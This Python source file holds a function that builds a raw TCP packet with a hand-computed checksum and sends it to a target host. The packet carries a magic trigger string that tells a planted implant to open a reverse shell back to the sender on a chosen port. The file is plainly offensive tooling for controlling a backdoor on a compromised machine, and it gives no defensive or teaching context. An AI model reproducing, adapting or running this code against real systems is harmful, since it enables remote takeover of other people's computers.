import socket
import struct


def _checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def trigger_reverse_shell(host, port, listen_port):
    """Send a raw TCP packet to trigger a reverse shell from the implant."""
    payload = b"JOLTEON_PAYLOAD_GET_REVERSE_SHELL" + str(listen_port).encode()

    # Get the source IP that routes to the target
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((host, 1))
    src_ip = s.getsockname()[0]
    s.close()

    src_port = 12345
    seq_num = 0
    ack_num = 0
    offset = 5 << 4
    flags = 0x18  # PSH + ACK
    window = 8192

    tcp_header = struct.pack(
        "!HHIIBBHHH",
        src_port, port, seq_num, ack_num,
        offset, flags, window, 0, 0,
    )

    tcp_len = len(tcp_header) + len(payload)
    pseudo = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(src_ip),
        socket.inet_aton(host),
        0, socket.IPPROTO_TCP, tcp_len,
    )

    csum = _checksum(pseudo + tcp_header + payload)

    tcp_header = struct.pack(
        "!HHIIBBHHH",
        src_port, port, seq_num, ack_num,
        offset, flags, window, csum, 0,
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.sendto(tcp_header + payload, (host, 0))
    sock.close()

    return src_ip
